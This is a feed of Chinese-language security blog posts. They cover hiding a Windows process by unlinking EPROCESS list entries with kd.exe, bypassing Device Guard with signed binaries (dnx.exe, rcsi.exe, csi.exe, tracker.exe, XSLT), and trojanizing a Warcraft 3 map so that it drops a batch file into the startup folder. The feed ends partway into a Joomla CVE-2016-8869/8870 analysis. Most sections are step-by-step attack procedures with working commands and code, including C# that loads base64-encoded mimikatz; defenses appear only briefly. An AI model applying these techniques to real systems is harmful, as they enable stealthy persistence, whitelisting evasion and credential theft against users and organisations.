相当于对双向链表ActiveProcessLinks断链 对应双链表的删除需要做如下操作： p-&gt;prior-&gt;next=p-&gt;nextFlink-&gt;Blink=Blink p-&gt;next-&gt;prior=p-&gt;priorBlink-&gt;Flink = Flink free(p)Blink =dwSelfEPROCESSFlink = dwSelfEPROCESS 接下来实例介绍如何通过kd.exe隐藏进程，也就是双链表的断链 0x03 通过kd.exe隐藏进程 环境搭建： 开启Local kernel debugging模式 注： 自从Windows Vista开始，Local kernel debugging默认被禁用 开启方法： 管理员权限执行：bcdedit -debug on,重启 下载安装Debugging Tools for Windows,找到kd.exe 测试进程：notepad.exe测试系统： Win10 x64 1、获取notepad.exe的内存起始地址kd命令： !process 0 0 $processName 完整命令： kd -kl -y &quot;srv*c:\symbols*http://msdl.microsoft.com/download/symbols&quot; -c &quot;!process 0 0 notepad.exe;Q&quot; 如图 notepad.exe的内存起始地址$processAddress为ffffe00195236080 2、获取进程notepad.exe的Flink和Blinkkd命令： dt nt!_eprocess ActiveProcessLinks ImageFileName $processAddress 完整命令： kd -kl -y &quot;srv*c:\symbols*http://msdl.microsoft.com/download/symbols&quot; -c &quot;dt nt!_eprocess ActiveProcessLinks ImageFileName ffffe00195236080;Q&quot; 如图 注： FLINK指针指向下一个元素，相当于双链表中的p-&gt;next BLINK指针指向前一个元素，相当于双链表中的p-&gt;prior _LIST_ENTRY结构如下： _LIST_ENTRY[Flink-Blink] 前一参数代表Flink，后一参数代表Blink 由上图可知： $Flink：0xffffe001`93e1a370 $Blink：0xffffe001`9604f6f0 3、获取进程notepad.exe在双链表的地址$thisProcessLinkskd命令： dt nt!_eprocess ActiveProcessLinks.Blink ImageFileName $processAddress 完整命令： kd -kl -y &quot;srv*c:\symbols*http://msdl.microsoft.com/download/symbols&quot; -c &quot;dt nt!_eprocess ActiveProcessLinks.Blink ImageFileName ffffe00195236080;Q&quot; 如图 可知： $thisProcessLinks：0xffffe001`95236370 注: dt nt!_eprocess ActiveProcessLinks.Blink ImageFileName相当于进程notepad.exe的前一个进程 故 +0x008 Blink ： 0xffffe001`9604f6f0 _LIST_ENTRY [0xffffe001`95236370-Blink] 中的0xffffe001`95236370相当于进程notepad.exe在双链表的地址$thisProcessLinks 补充： +0x000 Flink: 0xffffe001`93e1a370 _LIST_ENTRY[Flink-Blink]中的Blink也能代表双链表的地址$thisProcessLinks 简单的理解： 当前进程的Blink的Flink等价于当前进程的Flink的Blink，也就是当前进程的地址$thisProcessLinks 4、将前一进程指向下一个元素的指针FLINK替换为当前进程的FLINK指针(Flink-&gt;Blink=Blink)即双链表删除操作的第1步： p-&gt;prior-&gt;next=p-&gt;next kd命令： f $Blink+0x000 L4 ($Flink的第0字节) ($Flink的第1字节) ($Flink的第2字节) ($Flink的第3字节) 注： +0x000代表Flink +0x008代表Blink $Blink+0x000代表p-&gt;prior-&gt;next(0x000为0，可省略) L4参数指定内存区间的长度为4个DWORD 完整命令： kd -kl -y &quot;srv*c:\symbols*http://msdl.microsoft.com/download/symbols&quot; -c &quot;f 0xffffe001`9604f6f0 L4 0x70 0xa3 0xe1 0x93;Q&quot; 如图 操作成功，实现双链表删除中的p-&gt;prior-&gt;next=p-&gt;next 5、将下一进程指向前一个元素的指针Blink替换为当前进程的BLINK指针即双链表删除操作的第2步： p-&gt;next-&gt;prior=p-&gt;prior kd命令： f $Flink+0x008 L4 ($Blink的第0字节) ($Blink的第1字节) ($Blink的第2字节) ($Blink的第3字节) 注： +0x008代表Blink $Flink++0x008代表p-&gt;next-&gt;prior 完整命令： kd -kl -y &quot;srv*c:\symbols*http://msdl.microsoft.com/download/symbols&quot; -c &quot;f 0xffffe001`93e1a370 L4 0xf0 0xf6 0x04 0x96;Q&quot; 如图 操作成功，实现双链表删除中的p-&gt;next-&gt;prior=p-&gt;prior 6、进程自身的新Flink指向进程自身的双链表地址$thisProcessLinkskd命令： f $thisProcessLinks+0x000 L4 ($thisProcessLinks的第0字节) ($thisProcessLinks的第1字节) ($thisProcessLinks的第2字节) (thisProcessLinks的第3字节) 注： +0x000代表Flink 完整命令： kd -kl -y &quot;srv*c:\symbols*http://msdl.microsoft.com/download/symbols&quot; -c &quot;0xffffe001`95236370 L4 0x70 0x63 0x23 0x95;Q&quot; 如图 7、进程自身的新Blink指向进程自身的双链表地址$thisProcessLinkskd命令： f $thisProcessLinks+0x008 L4 ($thisProcessLinks的第0字节) ($thisProcessLinks的第1字节) ($thisProcessLinks的第2字节) (thisProcessLinks的第3字节) 注： +0x008代表Blink 完整命令： kd -kl -y &quot;srv*c:\symbols*http://msdl.microsoft.com/download/symbols&quot; -c &quot;0xffffe001`95236370+0x008 L4 0x70 0x63 0x23 0x95;Q&quot; 如图 注： 7、8操作必须，对应双链表删除操作中的free(p),否则会蓝屏 8、测试在tasklist和Process Explorer中，notepad.exe进程均被隐藏 0x04 powershell自动实现 以上操作可通过powershell脚本自动实现，这就是Hide-Me.ps1实现的功能 Hide-Me.ps1有一处需要注意的地方:https://github.com/giMini/PowerMemory/blob/master/PowerProcess/Hide-Me.ps1#L128 f $BLINK L4 0x$($FLINK.Substring(17,2)) 0x$($FLINK.Substring(15,2)) 0x$($FLINK.Substring(13,2)) 0x$($FLINK.Substring(11,2))&quot; 此处$BLINK实际为$BLINK+0x000,表示p-&gt;prior-&gt;next(0x000为0，已省略) 适用环境： Win7、8、10 64位操作系统 利用前提： 开启Local kernel debugging模式 管理员权限执行：bcdedit -debug on 重启后测试 由于PowerMemory做了脚本整合，所以Hide-Me.ps1还需要其他支持文件 我对其进行了少量修改，只提取隐藏进程的关键代码，最终整合到一个ps脚本中，地址如下： https://github.com/3gstudent/Hide-Process-by-kd.exe 0x05 防御思路 该方法利用前提： 已获得系统管理员权限并开启Local kernel debugging模式，系统重启 也就是说攻击者已进入ring 0层才能利用这个方法 对于普通用户，可以永久关闭Local kernel debugging模式： bcdedit -debug off 0x06 补充 该脚本尚不支持32位系统 Windbg也能实现相同操作 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Study Notes of using dnx.exe / rcsi.exe to bypass Decvice Guard UMCI]]></title>
    <url>%2Fposts%2Fa3199cf2.html</url>
    <content type="text"><![CDATA[0x00 前言 在Windows 10 Enterprise和Server 2016引入的新功能Decvice Guard是一种白名单机制，可用来阻止未授权的代码执行。 简单的理解，只要是不包含微软数字签名的程序，均无法用来执行代码。 然而，如果能够找到带有微软签名的程序，那么就能绕过Decvice Guard对应用程序的拦截，实现代码执行。 目前已知的方法有： 1、WinDbg/CDB 可用来执行shell code 作者：Matt Graeber@mattifestation 地址：http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html 2、CSI.exe 可用来执行c#代码 作者：Casey Smith@subTee 地址：https://twitter.com/subTee/status/796737674954608641 3、dnx.exe 可用来执行c#代码 作者：Matt Nelson@enigma0x3 地址：https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/ 4、rcsi.exe 可用来执行c#代码 作者：Matt Nelson@enigma0x3 地址：https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/ 0x01 简介 Matt Nelson@enigma0x3在最近分享了他绕过Decvice Guard的两种方法，这是继Matt Graeber@mattifestation和Casey Smith@subTee后的第三和第四种绕过方法，本文将重现这两个过程，完成他留给读者的两个作业，优化dnx.exe的环境搭建步骤，分享学习心得。 链接如下： https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/ https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/ 0x02 dnx.exe dnx.exe内置于.NET Execution environment，包含数字签名，可用来执行c#代码 首先搭建dnx.exe的使用环境 参考资料： https://blogs.msdn.microsoft.com/sujitdmello/2015/04/23/step-by-step-installation-instructions-for-getting-dnx-on-your-windows-machine/ 资料显示需要powershell v4.0和安装Visual C++ 2013 redistributable package，实际测试”print helloworld”并不需要这些条件，同时配置步骤也可以简化，以下为简化的配置步骤： 测试系统：Win8 x86 1、下载并安装Microsoft .NET Framework 4.5.2：下载地址： https://www.microsoft.com/zh-CN/download/confirmation.aspx?id=42643 2、安装DNVMcmd： powershell -NoProfile -ExecutionPolicy unrestricted -Command &quot;&amp;{$Branch=&#39;’&#39;dev&#39;;iex ((new-object net.webclient).DownloadString(&#39;https://raw.githubusercontent.com/aspnet/Home/dev/dnvminstall.ps1&#39;))}&quot; 如图 3、安装DNX打开新的cmd cmd： dnvm list 输入y，安装dnx 如图 cmd: dnvm install latest -Unstable -Persistent cmd: dnx 将会看到dnx的操作说明 如图 4、更新DNX和DNVM bitscmd: dnvm upgrade dnvm update-self 如图 5、配置Package新建文件夹test cmd： cd c:\test dnu restore -s https://www.myget.org/F/aspnetvnext 如图 注： 在C:\Windows\System32直接输入dnu restore -s https://www.myget.org/F/aspnetvnext会报错，如图 6、添加脚本文件新建文件Program.cs，内容如下： using System; public class Program { public static void Main() { Console.WriteLine(&quot;Hello World&quot;); } } 注： class名必须为Program，否则报错 新建文件project.json，内容如下： { &quot;dependencies&quot;:{ }, &quot;commands&quot;:{ &quot;test&quot;:&quot;test&quot; }, &quot;frameworks&quot;:{ &quot;dnx451&quot;:{}, &quot;dnxcore50&quot;:{ &quot;dependencies&quot;:{ &quot;System.Console&quot;:&quot;4.0.0-beta-*&quot; } } } } 注： project.json中”commands”内的”test”需要同文件夹名称test对应 注： 中文系统的浏览器复制https://blogs.msdn.microsoft.com/sujitdmello/2015/04/23/step-by-step-installation-instructions-for-getting-dnx-on-your-windows-machine/中的示例代码为unicode格式，直接使用会报错，如图 需要将其中的Unicode字符转化 7、测试脚本cmd: dnu restore 如图 cmd: dnx test 如图 注: 如果仅测试上述代码，只需完成步骤3即可 8、Win10 Device Guard测试dnx.exe测试成功后，接下来需要找到dnx.exe在Win10上使用需要包含哪些支持文件，最直观的方法可借助于ProcessMonitor 使用ProcessMonitor获取dnx.exe在运行时的操作，如图 找到关键目录： C:\Users\a\.dnx\runtimes\dnx-clr-win-x86.1.0.0-rc1-update2\bin\ 经实际测试，在Win10上使用，只需要该目录下的部分文件，大小为7.44MB 注： 这是Matt Nelson@enigma0x3留给读者的作业 文件列表如下： dnx.clr.dll dnx.exe dnx.onecore.dll Microsoft.CodeAnalysis.CSharp.dll Microsoft.CodeAnalysis.dll Microsoft.Dnx.ApplicationHost.dll Microsoft.Dnx.Compilation.Abstractions.dll Microsoft.Dnx.Compilation.CSharp.Abstractions.dll Microsoft.Dnx.Compilation.CSharp.Common.dll Microsoft.Dnx.Compilation.CSharp.dll Microsoft.Dnx.Compilation.dll Microsoft.Dnx.Host.Clr.dll Microsoft.Dnx.Host.dll Microsoft.Dnx.Loader.dll Microsoft.Dnx.Runtime.dll Microsoft.Extensions.PlatformAbstractions.dll System.Collections.Immutable.dll System.Reflection.Metadata.dll vcruntime140.dll(也可忽略，但会报错，不影响代码执行) 该目录下的这些文件不需要： dnu.cmd dnx.win32.dll Microsoft.Dnx.Compilation.DesignTime.dll Microsoft.Dnx.DesignTimeHost.Abstractions.dll Microsoft.Dnx.dll Microsoft.Dnx.Host.Mono.dll Microsoft.Dnx.Runtime.Internals.dll 如图，由于dnx.exe包含微软的签名证书，所以在Device Guard UMCI(user mode code integrity)开启的环境中仍具有执行权限 绕过成功 0x03 rcsi.exe rcsi.exe内置于Microsoft “Roslyn” CTP中，包含微软数字签名 Microsoft “Roslyn” CTP下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=34685&amp;tduid=(24d3dfde6075d394de05e49e871fa656)(256380)(2459594)(TnL5HPStwNw-qGm27mnsJb9VbqZPmTLajQ)() 安装前提： 安装Visual Studio 2012 安装VS2012 SDK 1、实际测试测试系统：Win8.1 x86安装Visual Studio 2012、VS2012 SDK、Microsoft “Roslyn” CTP 2、执行代码rcsi.exe的路径为： C:\Program Files\Microsoft Roslyn CTP\Binaries 新建文件test.csx，内容如下： using System; Console.WriteLine(&quot;Hello World&quot;); Console.ReadLine(); cmd: &quot;C:\Program Files\Microsoft Roslyn CTP\Binaries\rcsi.exe&quot; test.csx 如图，成功执行C#代码 rcsi.exe同csi.exe类似，可以用来执行c#代码，不同点在于csi.exe支持交互，而rcsi.exe不能 如图 3、Win10 Device Guard测试rcsi.exe在Win10上运行同样需要支持文件同样使用ProcessMonitor获取rcsi.exe在运行时的操作，如图 找到rcsi.exe需要的支持文件如下： C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Roslyn.Compilers.CSharp\v4.0_1.2.0.0__31bf3856ad364e35\Roslyn.Compilers.CSharp.dll C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Roslyn.Compilers\v4.0_1.2.0.0__31bf3856ad364e35\Roslyn.Compilers.dll 注： 这也是Matt Nelson@enigma0x3留给读者的作业 在Win10下测试成功，如图 0x04 防御 参照Matt Graeber的方法，更新Device Guard Bypass Mitigation Rules，可分别拦截利用WinDbg/CDB、csi.exe、dnx.exe和rcsi.exe的代码执行 参考地址如下： http://www.exploit-monday.com/2016/09/using-device-guard-to-mitigate-against.html 0x05 小结 本文对dnx.exe和rcsi.exe的利用方法做了介绍，截至目前共有四种绕过Device Guard的方法，相信未来会有更多的方法被发现，与此同时，防御手段也需要随之升级。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[War3地图“漏洞”分析介绍]]></title>
    <url>%2Fposts%2F31f8aff.html</url>
    <content type="text"><![CDATA[0x00 前言 最近腾讯电脑管家团队对利用《魔兽争霸3》漏洞传播的“萝莉”蠕虫进行了分析，介绍了“萝莉”蠕虫的运行流程。接着该“蠕虫”的作者在其网站对此做了澄清，我们暂且不八卦这个事件，只在技术层面分析一下这个《魔兽争霸3》漏洞到底是什么，如何利用以及如何防御。 “萝莉”蠕虫分析地址：http://www.freebuf.com/news/120136.html “蠕虫”的作者博客地址：https://blog.loxve.com/ 0x01 简介 该《魔兽争霸3》漏洞的流程如下： 1.攻击者上传修改过的魔兽地图，等待其他玩家进入房间游戏 2.玩家进入房间后，由于本地没有该地图，所以会自动下载该地图 3.地图同步后，玩家进入游戏，触发地图中的脚本，该脚本在启动目录写入bat文件 4.玩家电脑重启后，启动目录中的bat文件被执行，成功加载payload 0x02 相关概念 JASS是《魔兽争霸3》的脚本语言，用于控制地图的进程和行为, 是魔兽游戏和地图的基础 正常的地图编辑中摆放的单位(Unit), 设置的触发(Trigger)等最终都会被翻译成JASS语言，保存在地图文件中，在游戏运行时被调用 HkeW3mModifier是一个修改MPQ格式文件的工具，可用来修改加密过的mpq文件，带有强大的资源搜索功能，可以搜索出魔兽地图中大部分资源、重建列表，智能解压相关贴图 可用来查看和编辑地图中包含的文件资源 操作说明： 下载HkeW3mModifier.exe，选择地图，点击分析文件查看地图中包含的文件列表，如图 其中，war3map.j包含地图的逻辑控制代码，右键解压war3map.j后可查看其中的代码，部分代码如图 war3map.j中的文件结构1、变量声明 声明了脚本文件中使用的全局变量Lost Temple中的变量声明如下： //*************************************************************************** //* //* Global Variables //* //*************************************************************************** globals // Generated trigger gg_trg_Melee_Initialization = null endglobals function InitGlobals takes nothing returns nothing endfunction 2、触发器部分 声明了地图中使用的触发器 Lost Temple中的触发器部分如下： //*************************************************************************** //* //* Triggers //* //*************************************************************************** //=========================================================================== // Trigger: Melee Initialization // // Default melee game initialization for all players //=========================================================================== function Trig_Melee_Initialization_Actions takes nothing returns nothing call MeleeStartingVisibility( ) call MeleeStartingHeroLimit( ) call MeleeGrantHeroItems( ) call MeleeStartingResources( ) call MeleeClearExcessUnits( ) call MeleeStartingUnits( ) call MeleeStartingAI( ) call MeleeInitVictoryDefeat( ) endfunction //=========================================================================== function InitTrig_Melee_Initialization takes nothing returns nothing set gg_trg_Melee_Initialization = CreateTrigger( ) call TriggerAddAction( gg_trg_Melee_Initialization, function Trig_Melee_Initialization_Actions ) endfunction //=========================================================================== function InitCustomTriggers takes nothing returns nothing call InitTrig_Melee_Initialization( ) endfunction //=========================================================================== function RunInitializationTriggers takes nothing returns nothing call ConditionalTriggerExecute( gg_trg_Melee_Initialization ) endfunction 根据函数名称能够猜出表示的意思 function Trig_Melee_Initialization_Actions为触发器进行的操作 function InitTrig_Melee_Initialization用来初始化 function InitCustomTriggers为用户自定义触发器的注册 function RunInitializationTriggers的功能是运行触发器 3、主函数main 脚本文件的入口 Lost Temple中的main部分如下： //*************************************************************************** //* //* Main Initialization //* //*************************************************************************** //=========================================================================== function main takes nothing returns nothing call SetCameraBounds( -7936.0 + GetCameraMargin(CAMERA_MARGIN_LEFT), -8192.0 + GetCameraMargin(CAMERA_MARGIN_BOTTOM), 7936.0 - GetCameraMargin(CAMERA_MARGIN_RIGHT), 7680.0 - GetCameraMargin(CAMERA_MARGIN_TOP), -7936.0 + GetCameraMargin(CAMERA_MARGIN_LEFT), 7680.0 - GetCameraMargin(CAMERA_MARGIN_TOP), 7936.0 - GetCameraMargin(CAMERA_MARGIN_RIGHT), -8192.0 + GetCameraMargin(CAMERA_MARGIN_BOTTOM) ) call SetDayNightModels( &quot;Environment\\DNC\\DNCLordaeron\\DNCLordaeronTerrain\\DNCLordaeronTerrain.mdl&quot;, &quot;Environment\\DNC\\DNCLordaeron\\DNCLordaeronUnit\\DNCLordaeronUnit.mdl&quot; ) call NewSoundEnvironment( &quot;Default&quot; ) call SetAmbientDaySound( &quot;LordaeronSummerDay&quot; ) call SetAmbientNightSound( &quot;LordaeronSummerNight&quot; ) call SetMapMusic( &quot;Music&quot;, true, 0 ) call CreateAllUnits( ) call InitBlizzard( ) call InitGlobals( ) call InitCustomTriggers( ) call RunInitializationTriggers( ) endfunction 4、其他设置 如Unit Item Tables、Unit Creation、Players、Map Configuration暂略 0x03 Jass预读文件漏洞 Reference: http://bbs.islga.org/forum.php?mod=viewthread&amp;tid=48422&amp;extra=page%3D1&amp;page=1 JASS中三个特殊的函数： native PreloadGenClear takes nothing returns nothing native PreloadGenStart takes nothing returns nothing native PreloadGenEnd takes string filename returns nothing 以上三个函数用来记录PreloadGenStart()和PreloadGenEnd()之间执行的所有Preload()语句，并将它们写入到PreloadGenEnd()函数指定的pld文件里去 注： 类似于输出日志文件 示例： JASS代码如下： function Test takes nothing returns nothing call PreloadGenClear() call PreloadGenStart() call Preload( &quot;ReplaceableTextures \\CameraMasks\\White_mask.blp&quot; ) call PreloadGenEnd(&quot;c:\\test\\test.pld&quot;) endfunction 执行函数Test()后，就会在c:\test\下新建文件test.pld，并写入如下内容： function Test takes nothing returns nothing call Preload( &quot;ReplaceableTextures \\CameraMasks\\White_mask.blp&quot; ) call PreloadEnd( 0.0 ) endfunction 漏洞原理1、设置输出为bat文件如果将输出的.pld文件后缀名改为.bat，那么文件中的每一行被当作一段代码被执行（当然语句无效，不符合批处理的语法），如图 2、加入换行符\n在批处理的语法中，\n代表换行。虽然.pld文件输出的每行内容格式固定，但是，如果通过\n把call Preload()这一行中的内容截断，那么就能够实现在新的一行显示一条可被执行的批处理命令 示例： JASS代码如下： function Test takes nothing returns nothing call PreloadGenClear() call PreloadGenStart() call Preload(&quot;\n@echo Test\n&quot;) call PreloadGenEnd(&quot;c:\\test\\test.bat&quot;) endfunction 输出成test.bat后会包含换行符，输出的文件内容如下： function Test takes nothing returns nothing call Preload( &quot; @echo Test &quot; ) call PreloadEnd( 0.0 ) endfunction 此时，产生了新的一行代码@echo Test，@echo Test得到执行，如图 3、执行批处理默认JASS只能做到输出文件，无法执行文件，所以只能将文件输出到文件启动项下，在重启后得到执行 0x04 实际测试 1、测试HelloGA2012.w3m下载地址： http://bbs.islga.org/forum.php?mod=viewthread&amp;tid=48422&amp;extra=page%3D1&amp;page=1中的附件 war3版本：1.27.0.52240 加载地图HelloGA2012进入游戏后，按Esc键，如图，弹出提示，在D:\XX\下产生文件test.pld 跳到目录D:\XX\，找到test.pld，内容如下： function PreloadFiles takes nothing returns nothing call Preload( &quot; @cls @color a @echo Hello World @echo This is a sample of WC3 map generated BAT file. @echo Welcome to http://bbs.islga.org. Let&#39;s go 2012 with GA! @pause @exit &quot; ) call PreloadEnd( 0.0 ) endfunction 测试成功 2、手动修改官方地图LostTemple(1) 获得源文件 使用HkeW3mModifier打开官方地图(4)LostTemple.w3m，导出war3map.j (2) 添加payload 根据上文对war3map.j中文件结构的分析，在function Trig_Melee_Initialization_Actions内添加如下代码： call PreloadGenClear() call PreloadGenStart() call Preload(&quot;\n@echo Test\n&quot;) call PreloadGenEnd(&quot;c:\\test\\test.bat&quot;) 如图 (3) 保存 保存war3map.j后，在HkeW3mModifier选择替换(添加)文件，如图 选择重压缩，保存地图文件，如图 (4) 测试 将地图置于Maps文件夹下，进入游戏，地图被识别，如图 注：为便于测试，已将地图名称修改为Test；覆盖原地图，迷惑性更大 开始游戏，c:\test\下产生文件test.bat，内容如下： function PreloadFiles takes nothing returns nothing call Preload( &quot; @echo Test &quot; ) call PreloadEnd( 0.0 ) endfunction 如果将该文件输出到开机自启动目录，那么在重启后，文件将会执行 测试成功 0x05 补充 1、这个漏洞本身并不包含代码执行的功能，所以漏洞成功利用的关键在于找到一个执行代码的方法，最直接的方式为将文件输出到启动项中，当然，也可利用该漏洞实现对指定文件的修改 2、dota地图中war3map.j的位置为scripts\war3map.j,同样可以利用 0x06 小结 严格意义来讲，这个《魔兽争霸3》漏洞并不是一个漏洞，只是war3地图中支持一个输出文件的正常功能，利用这个功能，将精心构造的代码输出到特定位置，再配合其他方式来执行它。 所以该漏洞利用的关键在于执行的方式，通用方法无非就是写开机启动项。 对于普通用户来讲，注意本机的开机启动项目录就好，同时，杀毒软件也已经能够检测到该利用方式。 注意自我保护，谨防受骗上当。 适度游戏益脑，沉迷游戏伤身。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Study Notes Weekly No.4(Use tracker to load dll & Use csi to bypass UMCI & Execute C# from XSLT file)]]></title>
    <url>%2Fposts%2F4420d2e.html</url>
    <content type="text"><![CDATA[About: use tracker to load dll use csi to bypass Application Whitelisting execute C# from XSLT file 目录: 介绍利用tracker.exe加载dll的方法 如何利用csi.exe绕过Windows Device Guard 在XSLT文件转换过程中执行C#代码 0x01 use tracker to load dll Reference: https://twitter.com/subTee/status/793151392185589760 简介： Casey在Twitter分享的一个技巧，利用tracker.exe能够创建进程，注入dll，特别的是tracker.exe来自于SDK中，包含微软的数字签名，本文将要分享利用该技巧的一些心得,补充一个直接利用tracker.exe加载dll的技巧 Tracker.exe： Tracker.exe is used to start a process and inject FileTracker.dll into it just after creation. The file accesses of the target process are tracked, and written to a .tlog file 常见目录(需要安装SDK): C:\Program Files (x86)\Microsoft SDKs\Windows\v8.1A\bin\NETFX 4.5.1 Tools C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.6.1 Tools\x64 语法： Tracker.exe [选项] [@跟踪器响应文件] /c [命令行] /d 文件.dll : 使用跟踪 dll 文件.dll 启动进程。(默认值: 通过 PATH 提供的 FileTracker.dll) /i[f] &lt;路径&gt; : 用于跟踪日志输出的中间目录。(使用 /if 可立即将路径展开为完整路径)(默认值: 所跟踪进程中的当前目录) /o : 对每个文件执行跟踪操作 /m : 在跟踪日志中包含缺少的文件，即在进程关闭之前删除的那些文件 /u : 不从跟踪日志中删除重复的文件操作 /t : 跟踪命令行(将展开使用“@文件名”语法指定的响应文件) /a : 启用扩展跟踪: GetFileAttributes、GetFileAttributesEx /e : 启用扩展跟踪: GetFileAttributes、GetFileAttributesEx、RemoveDirectory、CreateDirectory /k : 在跟踪日志文件名中保留完整的工具链 /r 文件 1;文件 2;..;文件 n : 正在跟踪的主要根输入文件(默认值: 无) /c [命令行] : 要跟踪的命令(必须是最后一个参数) /? : 本帮助文本 实际测试： cmd下运行： Tracker.exe /d test.dll /c cmd.exe 如图，成功加载test.dll test.dll为默认包含导出函数的dll就好，示例代码如下： #include &quot;stdafx.h&quot; #include &lt;windows.h&gt; BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: MessageBox(NULL,L&quot;testexport&quot;, L&quot;testexport&quot;,MB_OK); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 分析： 这个技巧有如下特点： tracker.exe包含微软数字签名，可绕过应用程序白名单的限制 tracker.exe可以在启动进程的同时加载dll 但是如果只想通过tracker.exe加载dll的话，存在以下问题： 选择不存在或是权限不够的进程，无法加载dll 但是，可以通过一个特殊的进程来解决这个问题，如svchost.exe，那么在加载dll后，进程svchost.exe可以自动退出,这就实现了通过tracker.exe加载dll 防御： 对tracker.exe添加黑名单规则 0x02 use csi to bypass Application Whitelisting Reference: http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html 简介： 同样是利用带有微软签名的exe绕过白名单的技巧，Matt Graeber曾介绍过如何利用cdb.exe绕过Windows Device Guard，Casey这次介绍的是使用C#相关的csi.exe绕过Windows Device Guard的技巧，本文将分享这个技巧的研究心得，并完成Casey在博客中留给读者的作业——在win10未安装VS2015的环境下如何使用csi.exe csi.exe： 在Visual Studio 2015 Update 1引入 安装后位置在C:\Program Files (x86)\MSBuild\14.0\Bin 实际测试： 测试系统： Win10 安装Visual Studio 2015 1.在csi编译环境中直接执行代码 直接运行csi.exe会进入编译环境，可在里面直接填入代码并运行 如图 测试Casey在文章中的代码，从文件中读取base64加密过的mimikatz.exe，解密执行，代码如下： using System; using System.Reflection; string s = System.IO.File.ReadAllText(@&quot;c:\\test\\katz.txt&quot;); byte[] b = System.Convert.FromBase64String(s); Assembly a = Assembly.Load(b); MethodInfo method = a.EntryPoint; object o = a.CreateInstance(method.Name); method.Invoke(o, null); mimikatz.exe作base64加密后保存的文件katz.txt已上传，地址为：https://raw.githubusercontent.com/3gstudent/test/master/katz.txt 测试如图，成功解密并执行mimikatz.exe 2.执行.csx文件中的代码 将上述测试代码写在katz.csx文件中 csi编译环境下运行： #load &quot;c:\\test\\katz.csx&quot; 注: 文件路径必须包含双引号，load前缀# 测试如图，成功执行 3.在cmd下运行 可在cmd下csi.exe后面直接加.csx文件的路径 例如: &quot;C:\Program Files (x86)\MSBuild\14.0\Bin\csi.exe&quot; c:\test\katz.csx 测试如图，成功执行 当然，在Win10上面不是必须安装vs2015才能使用csi.exe，这也是Casey留给读者的作业，找到csi.exe使用需要的依赖项 我已经完成了这个作业，依赖项文件最少需要6.77MB，可在csi.exe的同级目录C:\Program Files (x86)\MSBuild\14.0\Bin下找到，将csi.exe及其依赖性上传到Win10系统即可直接使用 依赖项文件列表如下： Microsoft.CodeAnalysis.CSharp.dll Microsoft.CodeAnalysis.CSharp.Scripting.dll Microsoft.CodeAnalysis.dll Microsoft.CodeAnalysis.Scripting.dll System.AppContext.dll System.Collections.Immutable.dll System.IO.FileSystem.dll System.IO.FileSystem.Primitives.dll System.Reflection.Metadata.dll 补充： 该方法只用于Win10 防御：Matt Graeber分享了他的应对方法，更新了Device Guard Bypass MitigationRules，地址如下： https://twitter.com/mattifestation/status/781211230065332224 https://github.com/mattifestation/DeviceGuardBypassMitigationRules/ 0x03 execute C# from XSLT file Reference: https://twitter.com/subTee/status/796737674954608641 POC地址: https://gist.github.com/subTee/c34d0499e232c1501ff9f0a8dd302cbd#file-script-ps1 简介： Casey在Twitter分享了一个有意思的技巧，在XSLT文件转换的过程中执行C#代码，本节将分享这个技巧的心得，并扩充POC，结合之前的代码，实现通过XSLT文件执行shellcode XSLT： XSLT是extensible stylesheet language transformation(扩展样式表转换语言)的缩写 用于将XML文档转换成以下一种格式： HTML XML XHTML XSLT 文本 在转换操作的过程中，可以执行c#或VB代码，同VisualStudio Persistence中在编译过程执行代码类似 XSLT在web前端中用的比较多 实际测试： 将calc.xslt，example.xml，script.ps1三个文件放于同级目录，设置script.ps1中的路径变量$path 执行script.ps1，生成output.xml，弹出计算器，如图 参考如下链接可获得编写XSLT的更多提示：https://msdn.microsoft.com/en-us/library/wxaw5z5e(v=vs.110).aspx 于是基于之前的研究，实现了通过XSLT调用C#执行shellcode，地址如下： https://github.com/3gstudent/Execute-CSharp-From-XSLT-TEST/ 注: 主要是修改了calc.xslt文件 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Joomla 3.4.4-3.6.3 Account Creation &Privilege Escalation测试记录]]></title>
    <url>%2Fposts%2F3b1edc3d.html</url>
    <content type="text"><![CDATA[0x00 简介 涉及漏洞： CVE-2016-8869 CVE-2016-8870 利用上述漏洞，攻击者可以注册特权用户 POC: https://github.com/XiphosResearch/exploits/tree/master/Joomraa https://www.exploit-db.com/exploits/40637/?rss 分析文章： http://paper.seebug.org/88/ http://paper.seebug.org/86/ 注： 0x01和0x02内容节选自分析文章 http://paper.seebug.org/88/ http://paper.seebug.org/86/ 0x01 CVE-2016-8870 漏洞影响网站关闭注册的情况下仍可创建用户 影响版本3.4.4 to 3.6.3 漏洞原理存在两个用于用户注册的方法： 位于components/com_users/controllers/registration.php中的UsersControllerRegistration::register() 位于components/com_users/controllers/user.php中的UsersControllerUser::register() 相对于UsersControllerRegistration::register()，UsersControllerUser::register()的实现中并没有这几行代码： // If registration is disabled - Redirect to login page. if (JComponentHelper::getParams(&#39;com_users&#39;)-&gt;get(&#39;allowUserRegistration&#39;) == 0) { $this-&gt;setRedirect(JRoute::_(&#39;index.php?option=com_users&amp;view=login&#39;, false)); return false; } 这几行代码是检查是否允许注册，也就是说如果我们可以用UsersControllerUser::register()这个方法来进行注册就可以绕过这个检测 补丁分析官方删除了UsersControllerUser::register()方法 注： 以上引用自http://paper.seebug.org/86/ 0x02 CVE-2016-8869 漏洞影响网站关闭注册的情况下仍可创建特权用户 影响版本3.4.4 to 3.6.3 